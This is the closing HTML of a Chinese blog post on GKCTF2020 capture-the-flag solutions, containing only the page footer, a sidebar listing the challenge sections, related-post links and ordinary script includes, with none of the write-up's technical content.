</code></pre><div class="tags"><a href="/tags/GKCTF2020/" rel="tag"><i class="ic i-tag"></i> GKCTF2020</a></div></div><footer><div class="meta"><span id="2023/04/05/GKCTF2020/" class="item leancloud_visitors" data-flag-title="GKCTF2020WP" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2023/04/05/GKCTF2020/" title="GKCTF2020WP">https://blog.xcu.icu/2023/04/05/GKCTF2020/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;50.jpg" title="RMI浅记"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> java安全</span><h3>RMI浅记</h3></a></div><div class="item right"><a href="/2023/04/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;134.jpg" title="java反序列化"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> java安全</span><h3>java反序列化</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%AD%A6%E7%94%9F%E7%9A%84%E5%AF%86%E7%A0%81%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">小学生的密码题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%89%E5%AD%97%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">2.2.</span> <span class="toc-text">汉字的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babycrypto"><span class="toc-number">2.3.</span> <span class="toc-text">babycrypto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#backdoor"><span class="toc-number">2.4.</span> <span class="toc-text">Backdoor</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pok%C3%A9mon"><span class="toc-number">3.1.</span> <span class="toc-text">Pokémon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#code-obfuscation"><span class="toc-number">3.2.</span> <span class="toc-text">code obfuscation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#harley-quinn"><span class="toc-number">3.3.</span> <span class="toc-text">Harley Quinn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sail-a-boat-down-the-river"><span class="toc-number">3.4.</span> <span class="toc-text">Sail a boat down the river</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin"><span class="toc-number">4.1.</span> <span class="toc-text">CheckIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF"><span class="toc-number">4.2.</span> <span class="toc-text">老八小超市儿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve%E7%89%88%E7%AD%BE%E5%88%B0"><span class="toc-number">4.3.</span> <span class="toc-text">cve 版签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez%E4%B8%89%E5%89%91%E5%AE%A2-eznode"><span class="toc-number">4.4.</span> <span class="toc-text">EZ 三剑客 - EzNode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez%E4%B8%89%E5%89%91%E5%AE%A2-ezweb"><span class="toc-number">4.5.</span> <span class="toc-text">EZ 三剑客 - EzWeb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez%E4%B8%89%E5%89%91%E5%AE%A2-eztypecho"><span class="toc-number">4.6.</span> <span class="toc-text">EZ 三剑客 - EzTypecho</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/09/23/ISCC%E7%9A%84wp/" rel="bookmark" title="ISCC的wp">ISCC的wp</a></li><li class="active"><a href="/2023/04/05/GKCTF2020/" rel="bookmark" title="GKCTF2020WP">GKCTF2020WP</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">49</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">37</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2023/04/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="分类于 渗透测试">渗透测试</a></div><span><a href="/2022/11/04/VulnHub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Billu_b0x%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/" title="VulnHub靶机学习">VulnHub靶机学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8/" title="分类于 网络服务应用">网络服务应用</a></div><span><a href="/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/" title="nat模式+ip分配">nat模式+ip分配</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/" title="preg_match&amp;&amp;正则">preg_match&&正则</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a></div><span><a href="/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" title="hexo+github搭建个人博客">hexo+github搭建个人博客</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/05/16/CommonsCollections-1/" title="ConmonsCollection-1">ConmonsCollection-1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2022/11/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="CTFshow-web入门文件包含">CTFshow-web入门文件包含</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a></div><span><a href="/2022/10/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/" title="数据结构与算法入门">数据结构与算法入门</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="yii反序列化">yii反序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="分类于 数据库">数据库</a></div><span><a href="/2022/12/03/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%87%86%E8%AF%AD%E8%A8%80SQL/" title="关系数据库标准语言SQL">关系数据库标准语言SQL</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="CTFshow-web入门信息收集">CTFshow-web入门信息收集</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">490k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">7:25</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2023/04/05/GKCTF2020/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->